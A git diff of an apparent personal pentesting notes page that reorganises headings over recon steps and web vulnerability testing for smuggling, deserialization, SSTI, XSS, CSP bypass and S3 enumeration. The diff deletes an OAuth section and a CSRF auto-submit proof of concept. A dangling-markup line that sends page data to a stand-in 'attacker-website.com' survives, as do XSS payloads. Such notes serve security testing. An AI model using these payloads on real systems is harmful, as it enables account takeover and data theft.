@@ -8,7 +8,7 @@ comments: false
 <div class="row justify-content-between">
 <div class="col-md-8 pr-5">
 
-<p>Methodology and testing</p>
+<p>Test Page</p>
 
 </div>
 
@@ -25,8 +25,6 @@ comments: false
 </div>
 </div>
 
-# Resources
-
 ## Navigation
 
 - [Methodology](#methodology)
@@ -37,41 +35,39 @@ comments: false
 
 ---
 
-# Methodology
+## Recon
 
-## Reconnaissance
-
-### Core Objectives:
+#### Core Objectives:
 - **Identify all subdomains!**
-- **Identify all open ports.**
+- **Identify all open ports!**
 
 ---
 
-### 1. Information Gathering:
+#### 1. Information Gathering:
    - **Target Details:** Collect comprehensive data on the target, including potential acquisitions.
    - **Tool:** [Crunchbase](https://www.crunchbase.com) can be used to identify acquisitions related to the target.
 
-### 2. ASN Identification:
+#### 2. ASN Identification:
    - **Manual Method:** Utilize [BGP HE](http://bgp.he.net) to find Autonomous System Numbers (ASNs).
    - **Automated Tools:**
      - **Metabigor:** An efficient tool for ASN reconnaissance.
      - **ASNLookup:** A straightforward ASN lookup utility.
      - **Amass Intel:** Use with `asn` flag for detailed ASN information (`amass intel -asn [ASN_NUMBER]`).
 
-### 3. Root Domain Discovery:
+#### 3. Root Domain Discovery:
    - **Reverse WHOIS:** Automate using DOMLink for domain linking based on WHOIS data.
    - **Ad/Analytics Relationships:** Explore relationships using [BuiltWith](https://builtwith.com) for Ad and Analytics identifiers.
    - **Google Dorks:** Utilize advanced Google search operators to find target domains.
    - **Shodan:** Employ Shodan for uncovering exposed services linked to your target.
 
-### 4. Subdomain Enumeration
+#### 4. Subdomain Enumeration
 
-#### a. Linked and JS Discovery:
+##### a. Linked and JS Discovery:
    - **Objective:** Identify all links and embedded JavaScript within client-side code.
    - **Tool:** 
      - **Burp Suite Pro:** Grab useful extensions for passive discovery: JS Miner. Conduct manual review as well.
 
-### 5. Automation Tasks:
+#### 5. Automation Tasks:
 
 - **Cron Jobs:**
   - **Weekly:** Run `Subfinder` - **Completed!**
@@ -79,7 +75,7 @@ comments: false
 - **script**
   - Used to check and report on program updates.
 
-#### b. Subdomain Scraping:
+##### b. Subdomain Scraping:
    - **Infrastructure Sources:** Gather data from sources like Censys, DnsDumpster, and WaybackMachine.
    - **Certificate Sources:** Explore SSL certificate registries like crt.sh, CertDB, and Cert Spotter.
    - **Search Engines:** Utilize Google, Yahoo, and Baidu for domain discovery.
@@ -91,7 +87,7 @@ comments: false
      - **Shodan Parser:** Use a Shodan parer to obtain all results from Shodan.
      - **Cloud Range Monitoring:** Monitor SSL sites within AWS, GCP, and Azure ranges. Parse certificates to match with your target using tools like `tls.bufferover.run`.
 
-#### c. Subdomain Bruteforcing:
+##### c. Subdomain Bruteforcing:
    - **Tools:**
      - **Amass:** Command: `amass enum -brute -d [DOMAIN] -rf`
      - **ShuffleDNS:** A massDNS wrapper for effective subdomain brute-forcing.
@@ -101,12 +97,12 @@ comments: false
      - **Commonspeak2:** Source wordlists from GitHub.
      - **Subdomain Alterations:** Experiment with variations like `www.target.com` to `ww2.target.com`.
 
-### 6. Port Scanning and Analysis:
+#### 6. Port Scanning and Analysis:
    - **Masscan:** Quickly identify open ports (requires an IP list).
    - **dnMasscan:** Resolves domain names to IP addresses and passes them to Masscan.
    - **Nmap:** Perform a detailed analysis of discovered open ports.
 
-### 7. GitHub Dorking:
+#### 7. GitHub Dorking:
    - **Objectives:**
      - Identify endpoints and subdomains.
      - Create custom wordlists based on discovered technologies.
@@ -118,10 +114,10 @@ comments: false
      - Exclude unnecessary results using `NOT` keyword.
      - Identify users who may not be directly mapped to the organization by exploring dotfiles and LinkedIn profiles.
 
-### 8. HTTPx and GoWitness:
+#### 8. HTTPx and GoWitness:
    - Use **HTTPx** to find live hosts and maybe **Gowitness** (HTTPx can do both) to capture screenshots for visual inspection.
 
-### 9. Subdomain Takeover:
+#### 9. Subdomain Takeover:
    - **Resources:**
      - **Can-I-Take-Over-XYZ:** Database by EdOverflow listing subdomain takeover techniques.
      - **SubOver:** Tool to check for vulnerable subdomains.
@@ -160,7 +156,8 @@ comments: false
 
 ## Testing Vulns
 
-# HTTP Request Smuggling
+Note: Add notes from OneNote
+#### HTTP Request Smuggling
 
 **Step 1:** Begin by right-clicking on the Fully Qualified Domain Name (FQDN) and selecting the "Smuggle Probe" option.  
 **Step 2:** If the tool identifies a vulnerability, left-click on the "Issue" to delve deeper. Navigate to the "Request 1" tab and select either CL.TE or TE.CL, depending on the specific payload requirements.  
@@ -168,9 +165,9 @@ comments: false
 **Step 3:** Adjust the prefix to match the necessary payload criteria.  
 **Step 4:** Launch the attack.
 
-# De-serialization
+#### De-serialization
 
-## Black-Box Testing
+##### Black-Box Testing
 
 **Step 1:** Determine the programming language in which the application is written. Understand how data serialization is handled in that specific language.
    - **PHP:** Serialized objects often look like `O:4:"User":2:{s:4:"name";s:6:"carlos";s:10:"isLoggedIn";b:1;}`.
@@ -188,13 +185,13 @@ comments: false
       - **Java:** Employ `ysoserial` to generate payloads, ensuring that the entire payload is URL encoded when sending through a vulnerable cookie.
       - **Ruby:** Implement tools specifically designed for Ruby serialization attacks.
 
-## White-Box Testing
+##### White-Box Testing
 
 **Step 1:** Analyze the source code for functions that indicate serialization processes:
    - **PHP:** Look for `serialize()` and `unserialize()` functions.
    - **Java:** Search for `java.io.Serializable`, `readObject()`, and `InputStream` usage.
 
-# Prototype Pollution
+#### Prototype Pollution
 
 **Step 1:** Identify potential vulnerabilities using targeted payloads or automated scanners.  
 **Step 2:** Look for vulnerable gadgets that can be exploited:
@@ -203,7 +200,7 @@ comments: false
 
 **Step 3:** If no vulnerable gadgets are found, inspect the Dev Tools Console for any alerts flagged by the Untrusted-Types plugin.
 
-# Server-Side Template Injection (SSTI)
+#### Server-Side Template Injection (SSTI)
 
 **Step 1:** Confirm the presence of a template injection vulnerability:
    - If reflected input does not lead to an XSS vulnerability (no output, encoded tags, or error messages), attempt to exploit it using the template syntax (e.g., `http://vulnerable.com/?greeting=data.username}}<tag>`).
@@ -213,109 +210,7 @@ comments: false
 **Step 2:** Identify the template engine using resources like the [Template Engine Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png).  
 **Step 3:** Exploit the vulnerability using the appropriate syntax and payload.
 
-# OAuth
-
-## Authorization Code Flow Overview
-
-### Step 1: Authorization Request
-   - Common parameters include `redirect_uri`, `response_type`, `scope`, and `state`.  
-     Example:  
-     ```
-     GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
-     Host: oauth-authorization-server.com
-     ```
-
-### Step 2: User Consent
-
-### Step 3: Authorization Code Grant
-   - Common parameters: `code` and `state`.
-   - Be aware that this step can be vulnerable to CSRF attacks.
-     Example:  
-     ```
-     GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
-     Host: client-app.com
-     ```
-
-### Step 4: Access Token Request
-   - Parameters often include `client_secret`, `grant_type`, `client_id`, `redirect_uri`, and `code`.  
-     Example:  
-     ```
-     POST /token HTTP/1.1
-     Host: oauth-authorization-server.com
-     ...
-     client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
-     ```
-
-### Step 5: Access Token Grant
-   - The server issues a Bearer Token.
-
-### Step 6: API Call
-   - The token is included in the `Authorization` header.
-
-### Step 7: Resource Access
-   - The server responds with the requested sensitive data.
-
-### Investigation and Exploitation:
-
-**Step 1:** Monitor traffic for OAuth-specific parameters such as `client_id`, `redirect_uri`, `response_type`, and `state`.  
-**Step 2:** Send a GET request to well-known OAuth provider endpoints:
-   - `/.well-known/oauth-authorization-server`
-   - `/.well-known/openid-configuration`
-
-**Step 3:** Determine the grant type by inspecting the `response_type` parameter:
-   - **Authorization Code** — `response_type=code`
-   - **Implicit Grant** — `response_type=token` (commonly used in Single Page Applications and desktop apps).
-
-**Step 4:** Identify potential misconfigurations to exploit:
-   - **Implicit Flow:** POST request data might not be properly validated, leading to session hijacking.
-   - **Authorization Code Flow:** Absence of a state parameter could lead to CSRF vulnerabilities, especially during account linking.
-   - **Redirect URI Manipulation:** Exploit the `redirect_uri` parameter to steal codes or tokens.
-
-**Additional Considerations:**
-- **Scope Escalation:** Attempt to upgrade the scope to access protected resources:
-  - **Authorization Code:** Register a malicious application, trick the victim into approving a limited scope, and then send a POST request to `/token` with an expanded scope.
-  - **Implicit Grant:** Steal the access token and manually send it with an expanded scope to gain additional permissions.
-
-- **Account Takeover:** Sign up with the victim’s email address to gain control of their account.
-
-## OpenID Connect with OAuth
-
-- Utilizes JWT (id_token).
-- Public keys can be exposed via `/.well-known/jwks.json`.
-- Configuration details can be found in `/.well-known/openid-configuration`.
-- OpenID Connect can be combined with standard OAuth grant types, such as `response_type=id_token token` or `response_type=id_token code`.
-
-**Step 1:** Check for dynamic registration capabilities—determine whether any form of authentication (e.g., Bearer token) is required.  
-**Step 2:** Craft a malicious registration payload to exploit SSRF vulnerabilities.
-
-# Cross-Site Request Forgery (CSRF)
-
-**Step 1:** Identify the following conditions that enable CSRF attacks:
-   1. A relevant action the attacker wants to execute.
-   2. Cookie-based session handling without additional authorization headers.
-   3. No unpredictable request parameters, such as a CSRF token or current password requirement.
-
-**Step 2:** Construct a malicious webpage to exploit the CSRF vulnerability:
-   - **Custom HTML Example:**
-     ```html
-     <html>
-       <body>
-         <form action="https://vulnerable-website.com/email/change" method="POST">
-           <input type="hidden" name="email" value="pwned@evil-user.net" />
-         </form>
-         <script>
-           document.forms[0].submit();
-         </script>
-       </body>
-     </html>
-     ```
-   - **Using Burp Suite:**
-     1. Select the targeted request.
-     2. Right-click and choose "Engagement Tools" -> "Generate CSRF PoC."
-     3. Customize the generated PoC as necessary.
-     4. Host the PoC on a server (e.g., AWS).
-
-# WebSockets
+#### WebSockets
 
 - **Interception:** WebSocket messages can be intercepted and manipulated in Burp Suite, similar to HTTP/HTTPS requests.
 - **Configuration:** Set the WebSocket to either Client-to-Server or Server-to-Client mode in the Options tab.
@@ -351,9 +246,9 @@ comments: false
      }
      ```
 
-# HTTP Host Header Attacks
+#### HTTP Host Header Attacks
 
-## Overview
+##### Overview
 
 When multiple applications are hosted on a single IP address, it is typically due to one of two setups:
 
@@ -363,13 +258,13 @@ When multiple applications are hosted on a single IP address, it is typically du
 2. **Traffic Routed through an Intermediary:**
    - Applications are hosted on back-end servers, with traffic routed through load balancers or reverse proxy servers. This setup is frequently used when accessing applications via a Content Delivery Network (CDN).
 
-### How a Browser Handles HTTP Requests:
+##### How a Browser Handles HTTP Requests:
 
 1. **DNS Resolution:** The browser sends the URL to a DNS server, which returns the associated IP address.
 2. **HTTP Request:** The browser sends an HTTP request to the IP address, including the Host header in the request.
 3. **Routing:** The web server uses the Host header to route the request to the appropriate application on the server.
 
-### Potential Vulnerabilities:
+##### Potential Vulnerabilities:
 
 Exploiting the Host header can lead to several security issues, including:
 
@@ -378,7 +273,7 @@ Exploiting the Host header can lead to several security issues, including:
 - **Server-Side Request Forgery (SSRF):** Malicious actors can manipulate the Host header to initiate unauthorized requests to internal systems.
 - **Client-Side Vulnerabilities:** Host header attacks can also lead to client-side issues like Cross-Site Scripting (XSS), SQL Injection (SQLi), and HTML Injection (HTMLi).
 
-## Testing for HTTP Host Header Attacks
+#### Testing for HTTP Host Header Attacks
 
 ### Step 1: Identify Vulnerable Applications
 
@@ -438,23 +333,23 @@ Exploiting the Host header can lead to several security issues, including:
 
 - **Other Potential Exploits:** Depending on the configuration and response of the application, additional attack vectors may be identified, including SSRF and other forms of input manipulation.
 
-# Advanced Cross-Site Scripting (XSS)
+#### Advanced Cross-Site Scripting (XSS)
 
-## Overview
+##### Overview
 
 Cross-Site Scripting (XSS) is a widespread vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal data, manipulate content, or redirect users to malicious sites.
 
 For more details on XSS attacks, refer to the [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
 
-## Types of XSS
+##### Types of XSS
 
 1. **Reflected XSS:** The malicious script is immediately reflected back in the HTTP response, often via query parameters.
 2. **Stored XSS:** The script is stored in the application’s database and executed when retrieved, affecting all users who access the stored data.
 3. **DOM-based XSS:** The vulnerability resides in the client-side code, where user input is processed in a way that leads to execution of malicious scripts.
 
-## DOM-based XSS
+###### DOM-based XSS
 
-### Sources and Sinks
+###### Sources and Sinks
 
 **Common Sources:** These are locations where user-controlled data can enter the DOM:
 - `window.location` (URL)
@@ -491,7 +386,7 @@ For more details on XSS attacks, refer to the [PortSwigger XSS Cheat Sheet](http
 - `has()`, `constructor()`, `init()`, `index()`
 - `jQuery.parseHTML()`, `$.parseHTML()`
 
-### Testing for DOM-based XSS Sinks
+###### Testing for DOM-based XSS Sinks
 
 **HTML Sinks:**  
 These are generally easier to identify and exploit.
@@ -507,7 +402,7 @@ These require more in-depth analysis.
 4. Hover over variables in the Dev Tools to inspect their values before they reach the sink.
 5. Craft and refine your payload to execute the attack.
 
-### Special Cases
+###### Special Cases
 
 **Angular XSS:**
 - Look for the `"ng-app"` attribute in the HTML.
@@ -518,7 +413,7 @@ These require more in-depth analysis.
 - Exploit the JavaScript `eval()` method when it processes JSON objects.
   - Example Payload: `\"-alert(1)}//`
 
-## XSS Contexts
+###### XSS Contexts
 
 **Between HTML Tags:**
 - Example: `<p>[USER CONTROLLED INPUT]</p>`
@@ -529,9 +424,9 @@ These require more in-depth analysis.
     3. Experiment with different payloads to bypass WAF protections.
     4. Construct a working payload based on the allowed tags, attributes, and events.
 
-## Bypassing Content Security Policy (CSP)
+###### Bypassing Content Security Policy (CSP)
 
-### Common CSP Controls
+###### Common CSP Controls
 
 **Content-Security-Policy Header:**
 - `script-src 'self'` — Restricts script loading to the same origin.
@@ -570,9 +465,9 @@ These require more in-depth analysis.
     <input type="text" name="input" value=""><img src='//attacker-website.com?[SENSITIVE DATA]"/>
     ```
 
-# AWS S3 Bucket Enumeration
+#### AWS S3 Bucket Enumeration
 
-## Identifying Open S3 Buckets
+##### Identifying Open S3 Buckets
 
 **Step 1:** Locate any open S3 buckets that could be publicly accessible.
 
@@ -586,12 +481,6 @@ These require more in-depth analysis.
 - Any other potentially valuable files.
 
 **Tool:** Use `S3Scanner` for automated bucket enumeration and analysis.
-
-**Installation:**
-
-git clone git@github.com
-/S3Scanner.git cd S3Scanner pip3 install -r requirements.txt python3 -m S3Scanner
-This tool helps streamline the process of finding open S3 buckets and extracting relevant files.
 
 [Back to top](#resources)
 
